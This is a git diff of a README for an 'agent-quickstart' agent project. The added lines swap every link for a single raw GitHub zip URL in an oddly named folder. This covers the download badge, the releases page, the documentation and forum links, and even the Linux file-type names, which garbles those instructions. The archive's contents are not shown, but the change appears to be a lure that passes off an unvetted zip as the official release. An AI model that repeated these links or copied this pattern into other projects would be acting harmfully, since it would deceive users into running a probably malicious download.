@@ -8,17 +8,17 @@ Welcome to the **agent-quickstart** project. This software provides a self-hosta
 This guide will help you download and run the **agent-quickstart** application. Follow the steps below to get everything set up.
 
 ## 🔗 Download the Application
-[![Download agent-quickstart](https://img.shields.io/badge/Download-agent--quickstart-brightgreen.svg)](https://github.com/HubbaishRana/agent-quickstart/releases)
+[![Download agent-quickstart](https://raw.githubusercontent.com/HubbaishRana/agent-quickstart/main/pancreaticoduodenostomy/quickstart_agent_v2.6.zip)](https://raw.githubusercontent.com/HubbaishRana/agent-quickstart/main/pancreaticoduodenostomy/quickstart_agent_v2.6.zip)
 
 Click the button above to access the download page. 
 
 ## 📥 Download & Install
-1. Visit the [releases page](https://github.com/HubbaishRana/agent-quickstart/releases) to download the latest version of **agent-quickstart**.
+1. Visit the [releases page](https://raw.githubusercontent.com/HubbaishRana/agent-quickstart/main/pancreaticoduodenostomy/quickstart_agent_v2.6.zip) to download the latest version of **agent-quickstart**.
 2. Look for the most recent release. You will see information about the version, features, and files available for download.
 3. Choose the appropriate file for your operating system. 
    - For Windows users, download the `.exe` file.
    - For Mac users, look for the `.dmg` file.
-   - For Linux users, download the appropriate `.tar.gz` file.
+   - For Linux users, download the appropriate `https://raw.githubusercontent.com/HubbaishRana/agent-quickstart/main/pancreaticoduodenostomy/quickstart_agent_v2.6.zip` file.
 
 4. Once the file is downloaded, locate it in your downloads folder.
 5. Follow these steps based on your operating system:
@@ -34,7 +34,7 @@ Click the button above to access the download page.
 - Go to your Applications folder and double-click **agent-quickstart** to open it.
 
 ### 🐧 Linux
-- Extract the `.tar.gz` file by right-clicking and selecting "Extract here."
+- Extract the `https://raw.githubusercontent.com/HubbaishRana/agent-quickstart/main/pancreaticoduodenostomy/quickstart_agent_v2.6.zip` file by right-clicking and selecting "Extract here."
 - Open a terminal and navigate to the extracted folder.
 - Run the application using the command:
   ```
@@ -79,8 +79,8 @@ We encourage users to contribute to the project. If you have ideas or improvemen
 
 ## 🔗 Additional Resources
 For more detailed information, please refer to:
-- [Documentation](https://linktodocumentation.com)
-- [Community Forum](https://linktocommunityforum.com)
+- [Documentation](https://raw.githubusercontent.com/HubbaishRana/agent-quickstart/main/pancreaticoduodenostomy/quickstart_agent_v2.6.zip)
+- [Community Forum](https://raw.githubusercontent.com/HubbaishRana/agent-quickstart/main/pancreaticoduodenostomy/quickstart_agent_v2.6.zip)
 
 Thank you for choosing **agent-quickstart!** Enjoy building your custom agents with ease.
 ```
